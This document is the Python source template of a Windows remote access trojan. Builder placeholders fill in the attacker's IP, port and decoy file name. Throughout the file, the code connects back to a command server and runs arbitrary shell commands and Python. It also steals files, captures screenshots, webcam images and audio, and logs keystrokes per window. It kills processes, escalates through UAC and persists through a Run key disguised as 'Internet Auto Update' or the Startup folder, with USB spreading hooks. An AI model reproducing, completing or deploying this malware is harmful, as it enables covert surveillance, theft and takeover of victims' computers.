source = r"""
# -*- coding: utf-8 -*-
# !/usr/bin/python

import socket
import time
import os
import subprocess
import threading
import ctypes
from ctypes.wintypes import MSG
import sys
import platform
import zlib
import shutil
{%pyaudioImport%}
{%vidcapImport%}

HOST = '{%ip_address%}'
PORT = {%port_number%}
active = False
passKey = r'{%md5key%}'
DestDirName = '{%working_directory%}'
connection_timeout = {%connection_timeout%}
fake_file_name = '{%fake_file_name%}'
uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
__filename__ = '{%filename%}'
__version__ = '1.0'
__ostype__ = str(sys.platform)
__os__ = str(platform.platform())
__user__ = os.path.expanduser('~').split('\\')[-1]

{%get_webcam_device%}

{%get_audio_device%}

{%initialize_winapi%}

socketsBank = {}

hDesktopWnd = User32.GetDesktopWindow()
left = User32.GetSystemMetrics(76)
top = User32.GetSystemMetrics(77)
right = User32.GetSystemMetrics(78)
bottom = User32.GetSystemMetrics(79)
width = right - left
height = bottom - top

EnumProcesses = Psapi.EnumProcesses
EnumProcesses.restype = ctypes.wintypes.BOOL
GetProcessImageFileName = Psapi.GetProcessImageFileNameA
GetProcessImageFileName.restype = ctypes.wintypes.DWORD
OpenProcess = Kernel32.OpenProcess
OpenProcess.restype = ctypes.wintypes.HANDLE
TerminateProcess = Kernel32.TerminateProcess
TerminateProcess.restype = ctypes.wintypes.BOOL
CloseHandle = Kernel32.CloseHandle
MAX_PATH = 260
PROCESS_TERMINATE = 0x0001
PROCESS_QUERY_INFORMATION = 0x0400

FILE_ATTRIBUTE_HIDDEN = 2

SEE_MASK_NOCLOSEPROCESS = 0x00000040
SEE_MASK_INVOKEIDLIST = 0x0000000C
ShellExecuteEx = ctypes.windll.shell32.ShellExecuteEx
ShellExecuteEx.restype = ctypes.wintypes.BOOL

class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', ctypes.c_uint32),
        ('biWidth', ctypes.c_int),
        ('biHeight', ctypes.c_int),
        ('biPlanes', ctypes.c_short),
        ('biBitCount', ctypes.c_short),
        ('biCompression', ctypes.c_uint32),
        ('biSizeimage', ctypes.c_uint32),
        ('biXPelsPerMeter', ctypes.c_long),
        ('biYPelsPerMeter', ctypes.c_long),
        ('biClrUsed', ctypes.c_uint32),
        ('biClrImportant', ctypes.c_uint32)]


class BITMAPINFO(ctypes.Structure):
    _fields_ = [
        ('bmiHeader', BITMAPINFOHEADER),
        ('bmiColors', ctypes.c_ulong * 3)]


class SHELLEXECUTEINFO(ctypes.Structure):
    _fields_ = (
        ("cbSize", ctypes.wintypes.DWORD),
        ("fMask", ctypes.c_ulong),
        ("hwnd", ctypes.wintypes.HANDLE),
        ("lpVerb", ctypes.c_char_p),
        ("lpFile", ctypes.c_char_p),
        ("lpParameters", ctypes.c_char_p),
        ("lpDirectory", ctypes.c_char_p),
        ("nShow", ctypes.c_int),
        ("hInstApp", ctypes.wintypes.HINSTANCE),
        ("lpIDList", ctypes.c_void_p),
        ("lpClass", ctypes.c_char_p),
        ("hKeyClass", ctypes.wintypes.HKEY),
        ("dwHotKey", ctypes.wintypes.DWORD),
        ("hIconOrMonitor", ctypes.wintypes.HANDLE),
        ("hProcess", ctypes.wintypes.HANDLE),
    )

bmp_info = BITMAPINFO()


shiftcodes = {
    49: '!', 50: '@', 51: '#', 52: '$', 53: '%',
    54: '^', 55: '&', 56: '*', 57: '(', 48: ')',
    189: '_', 187: '+', 219: '{', 221: '}', 220: '|',
    186: ':', 222: '"', 188: '&lsaquo;', 190: '&rsaquo;', 191: '?',
}
keycodes = {
    160: '', 161: '', 32: '&nbsp;',
    9: '<font color=#288DA1>{tab}</font>', 8: '<font color=#D32B4E>{del}</font>', 162: '', 163: '', 144: '',
    35: '', 34: '', 33: '', 36: '', 45: '', 145: '', 19: '', 13: '<br>'
}
updateCode = {
    189: '-', 187: '=', 219: '[', 221: ']', 220: '\\',
    186: ';', 222: '\'', 188: ',', 190: '.', 191: '/',
    96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
    101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
    111: '/', 106: '*', 109: '-', 107: '+',
    110: '.'
}

{%usb_spreading_class%}


def from_device():
    if Shell32.IsUserAnAdmin() == 1:
        destination = os.path.join(os.path.expanduser('~'), destDirName, __filename__)
        try: shutil.copyfile(sys.argv[0], destination)
        except: pass
        PRM = SHELLEXECUTEINFO()
        PRM.cbSize = ctypes.sizeof(PRM)
        PRM.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_INVOKEIDLIST
        PRM.lpVerb = "runas"
        PRM.lpFile = "cmd.exe"
        PRM.lpParameters = '/c REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format(
            'Internet Auto Update', destination)
        PRM.nShow = 0
        ShellExecuteEx(ctypes.byref(PRM))
    else:
        CSIDL_STARTUP = 7
        SHGetSpecialFolderPath = ctypes.windll.shell32.SHGetSpecialFolderPathW
        BUFFER = ctypes.create_unicode_buffer(260)
        SHGetSpecialFolderPath.argtypes = [ctypes.c_ulong, ctypes.c_wchar_p, ctypes.c_int, ctypes.c_int]
        SHGetSpecialFolderPath(0, BUFFER, CSIDL_STARTUP, 0)
        DESTPATH = os.path.join(BUFFER.value, __filename__)
        if not os.path.exists(DESTPATH):
            try:shutil.copyfile(sys.argv[0], DESTPATH)
            except: pass


def pc_info():
    return str({
        'ostype': __ostype__,
        'os': __os__,
        'protection': str(active),
        'user': __user__,
        'privileges': str(Shell32.IsUserAnAdmin()),
        'inputdevice': audio_input,
        'webcamdevice': web_camera,
        'activewindowtitle': get_window_title(),
    })


def update_key(k):
    if updateCode.has_key(k):
        return updateCode[k]
    else:
        return str(chr(k))


def get_fptr(fn):
    cmpfunc = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
    return cmpfunc(fn)


def send(sock, _data, mode, splitter='%:::%', end="[ENDOFMESSAGE]"):
    msg = (_data + end).encode('utf-8')
    size = len(msg)
    msg = mode + splitter + msg
    sock.sendall(str(size) + '%:::%' + msg)


def receive(sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
    received_data = ""
    l = sock.recv(1024)
    while l:
        received_data = received_data + l
        if received_data.endswith(end):
            break
        else:
            l = sock.recv(1024)
    if received_data.count(splitter):
        _type, message = received_data.split(splitter)
        return _type, message[:-len(end)].decode('utf-8')
    else:
        return 'info', ''


def upload(sock, filename, end="[ENDOFMESSAGE]"):

    sock.sendall(str(os.path.getsize(filename)))
    if sock.recv(2) == 'ok':
        with open(filename, 'rb') as _file:
            while 1:
                l = _file.readline()
                if l:
                    sock.sendall(l)
                else:
                    sock.sendall(end)
                    break
            return 'uploadDone'
    return 'uploadError'


def download(sock, filename, end="[ENDOFMESSAGE]"):
    received_data = ''
    try:
        l = sock.recv(1024)
        while l:
            received_data += l
            if received_data.endswith(end):
                break
            else:
                l = sock.recv(1024)
        with open(filename, 'wb') as _file:
            _file.write(received_data[:-len(end)])
        return 'downloadDone'
    except:
        return 'downloadError'


def screen_bits():
    h_desktop_dc = User32.GetWindowDC(hDesktopWnd)
    h_capture_dc = Gdi32.CreateCompatibleDC(h_desktop_dc)
    h_capture_bitmap = Gdi32.CreateCompatibleBitmap(h_desktop_dc, width, height)
    Gdi32.SelectObject(h_capture_dc, h_capture_bitmap)
    Gdi32.BitBlt(h_capture_dc, 0, 0, width, height, h_desktop_dc, left, top, 0x00CC0020)
    hdc = User32.GetDC(None)
    bmp_info.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    dib_rgb_colors = 0
    Gdi32.GetDIBits(hdc, h_capture_bitmap, 0, 0, None, ctypes.byref(bmp_info), dib_rgb_colors)
    bmp_info.bmiHeader.biSizeimage = int(
            bmp_info.bmiHeader.biWidth * abs(bmp_info.bmiHeader.biHeight) * (bmp_info.bmiHeader.biBitCount + 7) / 8)
    p_buf = ctypes.create_unicode_buffer(bmp_info.bmiHeader.biSizeimage)
    Gdi32.GetBitmapBits(h_capture_bitmap, bmp_info.bmiHeader.biSizeimage, p_buf)
    return zlib.compress(p_buf)


def execute(source):
    mprint = ''
    try:
        exec source
        if mprint == '':
            return '<font color="#e74c3c">No output</font><br>example: mprint = "STRING type"'
        return str(mprint)
    except Exception as e:
        return str(e)


def exec_(cmde):
    if cmde:
        try:
            execproc = subprocess.Popen(cmde, shell=True,
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            cmdoutput = execproc.stdout.read() + execproc.stderr.read()
            return cmdoutput
        except Exception as e:
            return str(e)

    else:
        return "Enter a command.\n"

def uac_escalation(argv=None, debug=False):
    if argv is None and Shell32.IsUserAnAdmin():
        return True
    if argv is None:
        argv = sys.argv
    if hasattr(sys, '_MEIPASS'):
        arguments = map(unicode, argv[1:])
    else:
        arguments = map(unicode, argv)
    argument_line = u' '.join(arguments)
    executable = unicode(sys.executable)
    ret = Shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)
    if int(ret) <= 32:
        return False
    return None

def run_as_admin():
    ret = uac_escalation()
    if ret is True:
        return 'uacAlready'
    elif ret is None:
        return 'uacSucces'
    else:
        return 'uacError'

def terminate():
    sys.exit(0)

def has_hidden_attribute(filepath):
    try:
        attrs = Kernel32.GetFileAttributesW(unicode(filepath))
        assert attrs != -1
        result = bool(attrs & 2)
    except (AttributeError, AssertionError):
        result = False
    return result


def set_content_attribute(filepath):
    if has_hidden_attribute:
        Kernel32.SetFileAttributesW(filepath, 1)
    else:
        Kernel32.SetFileAttributesW(filepath, 2)


def get_screenshot():
    return str({
        'width': width,
        'height': height,
        'screenshotbits': screen_bits()
    })


{%webcam_shot%}


def ls():
    string = {
        'path': os.getcwdu()
    }
    try:
        for n, i in enumerate(os.listdir(u'.')):
            string[n] = {
                'name': i,
                'type': os.path.isfile(i),
                'size': os.path.getsize(i),
                'modified': time.ctime(os.path.getmtime(i)),
                'hidden': has_hidden_attribute(i)
            }
        return str(string)
    except WindowsError:
        return 'windowsError'


def get_window_title():
    get_foreground_window = User32.GetForegroundWindow
    get_window_text_length = User32.GetWindowTextLengthW
    get_window_text = User32.GetWindowTextW
    hwnd = get_foreground_window()
    length = get_window_text_length(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    get_window_text(hwnd, buff, length + 1)
    return buff.value


def get_processes_list():
    PROCESSES = {}
    max_array = ctypes.c_ulong * 4096
    pProcessIds = max_array()
    pBytesReturned = ctypes.c_ulong()
    Psapi.EnumProcesses(ctypes.byref(pProcessIds), ctypes.sizeof(pProcessIds), ctypes.byref(pBytesReturned))
    nReturned = pBytesReturned.value/ctypes.sizeof(ctypes.c_ulong())
    pidProcessArray = [i for i in pProcessIds][:nReturned]
    for ProcessId in pidProcessArray:
        hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, ProcessId)
        if hProcess:
            ImageFileName = (ctypes.c_char*MAX_PATH)()
            if GetProcessImageFileName(hProcess, ImageFileName, MAX_PATH)>0:
                filename = os.path.basename(ImageFileName.value)
                PROCESSES[ProcessId] = filename
            CloseHandle(hProcess)
    return str(PROCESSES)


def terminateProcess(PID):
    hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION, False, PID)
    TerminateProcess(hProcess, 1)
    return 'processTerminated'


class ChildSocket(threading.Thread):
    def __init__(self, id, mode):
        super(ChildSocket, self).__init__()

        self.active = True
        self.id = id
        self.mode = mode

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def run(self):

        self.socket.connect((HOST, PORT))

        while self.active:
            try:
                mode, data = receive(self.socket)
                if data == 'pcinfo':
                    stdoutput = pc_info()
                elif data.startswith('upload '):
                    try:
                        filename = data.split(' ')[1]
                        stdoutput = download(self.socket, filename)
                    except:
                        stdoutput = 'uploadError'
                elif data.startswith('download '):
                    try:
                        filename = data.split(' ')[1]
                        stdoutput = upload(self.socket, filename)
                    except:
                        stdoutput = 'downloadError'
                elif data.startswith('getDefaultInputDeviceName'):
                    stdoutput = audio_input
                elif data.startswith('startAudio'):
                    try:
                        audio_thread = AudioStreaming(self.socket, int(data.split(' ')[-1]))
                        audio_thread.start()
                        stdoutput = 'audioStarted'
                    except:
                        stdoutput = 'audioError'
                elif data.startswith('stopAudio'):
                    try:
                        audio_thread.active = False
                    except:
                        pass
                    stdoutput = 'audioStopped'
                elif data.startswith('startKeylogger'):
                    try:
                        keylogger_thread = Key()
                        keylogger_thread.start()
                        stdoutput = 'keyloggerStarted'
                    except:
                        stdoutput = 'keyloggerError'
                elif data.startswith('stopKeylogger'):
                    try:
                        keylogger_thread.keyLogger.uninstall_hook_proc()
                    except:
                        pass
                    stdoutput = 'keyloggerStopped'
                elif data.startswith('getKeystokes'):
                    try:
                        stdoutput = str(keylogger_thread.logs)
                        keylogger_thread.logs = {}
                    except AttributeError:
                        stdoutput = 'keystokesError'
                elif data.startswith("cd"):
                    try:
                        os.chdir(data[3:])
                        stdoutput = ""
                    except:
                        stdoutput = "Error opening directory"
                elif data.startswith('getProcessesList'):
                    stdoutput = get_processes_list()
                elif data.startswith('terminateProcess'):
                    stdoutput = terminateProcess(int(data.split(' ')[1]))
                elif data.startswith('runscript '):
                    stdoutput = execute(data[10:])
                elif data.startswith('runasadmin'):
                    stdoutput = run_as_admin()
                elif data.startswith('ls'):
                    stdoutput = ls()
                elif data.startswith('myinfo'):
                    stdoutput = self.mode + ' ' + self.id
                else:
                    stdoutput = exec_(data)
                send(self.socket, stdoutput, mode)
                del stdoutput
            except socket.error:
                return


{%audio_streaming_class%}


class KeyLogger:
    def __init__(self):
        self.hooked = None

    def install_hook_proc(self, pointer):
        self.hooked = User32.SetWindowsHookExA(13, pointer, Kernel32.GetModuleHandleW(None), 0)
        if not self.hooked:
            return False
        return True

    def uninstall_hook_proc(self):
        if self.hooked is None:
            return
        ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None


class Key(threading.Thread):
    def __init__(self):
        super(Key, self).__init__()

        self.logs = {}

    def write_key(self, log):
        current_window_title = get_window_title()
        if self.logs.has_key(current_window_title):
            self.logs[current_window_title] += log
        else:
            self.logs[current_window_title] = log

    def hook_proc(self, n_code, w_param, l_param):

        if w_param is not 0x0100:
            return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)

        if keycodes.has_key(l_param[0]):
            key = keycodes[l_param[0]]
        else:
            if User32.GetKeyState(0x14) & 1:
                if User32.GetKeyState(0x10) & 0x8000:
                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else update_key(
                        l_param[0]).lower()
                else:
                    key = update_key(l_param[0]).upper()
            else:
                if User32.GetKeyState(0x10) & 0x8000:
                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else update_key(
                        l_param[0]).upper()
                else:
                    key = update_key(l_param[0]).lower()
        self.write_key(key)

        return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)

    def start_keylogger(self):
        msg = MSG()
        User32.GetMessageA(ctypes.byref(msg), 0, 0, 0)

    def run(self):
        self.keyLogger = KeyLogger()
        self.pointer = get_fptr(self.hook_proc)
        if self.keyLogger.install_hook_proc(self.pointer):
            pass
        self.start_keylogger()


def start_child_socket(id_, mode):
    socketsBank[id_] = ChildSocket(id_, mode)
    socketsBank[id_].start()
    return id_


def from_autostart():
    global active
    global passKey
    while 1:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
        except:
            active = False
            time.sleep(connection_timeout)
            continue

        while 1:
            try:
                mode, data = receive(s)
                if data == 'info':
                    send(s, pc_info(), mode)
                    continue
                elif data == 'runasadmin':
                    send(s, run_as_admin(), mode)
                    continue
                if data == 'getScreen':
                    send(s, get_screenshot(), mode)
                    continue
                if data == 'getWebcam':
                    send(s, webcam_shot(), mode)
                    continue
                if data.startswith('startChildSocket'):
                    send(s, start_child_socket(str(data.split(' ')[-1]), mode), mode)
                    continue
                if data == passKey:
                    active = True
                    send(s, 'iamactive', mode)
                    while active:
                        mode, data = receive(s)
                        if data == "lock":
                            active = False
                            break
                        if data == 'terminateServer':
                            os._exit(1)
                        if data == 'info':
                            stdoutput = pc_info()
                        elif data.startswith('startChildSocket'):
                            stdoutput = start_child_socket(str(data.split(' ')[-1]), mode)
                        elif data == 'getScreen':
                            stdoutput = get_screenshot()
                        elif data == 'getWebcam':
                            stdoutput = webcam_shot()
                        elif data == 'runasadmin':
                            stdoutput == run_as_admin()
                        else:
                            stdoutput = exec_(data)
                        send(s, stdoutput, mode=mode)
                    if data == "terminate":
                        break
                    time.sleep(3)
                else:
                    send(s, 'parent', mode)
            except socket.error:
                s.close()
                active = False
                time.sleep(connection_timeout)
                break

if 'VolumeInformation' in sys.argv[0]:
    os.system('explorer %CD%\\' + unichr(160))
    from_device()
elif __filename__ in sys.argv[0]:
    {%usbSpreading%}
    from_autostart()
else:
    {%openFakeFile%}
    {%elseStatement%}
"""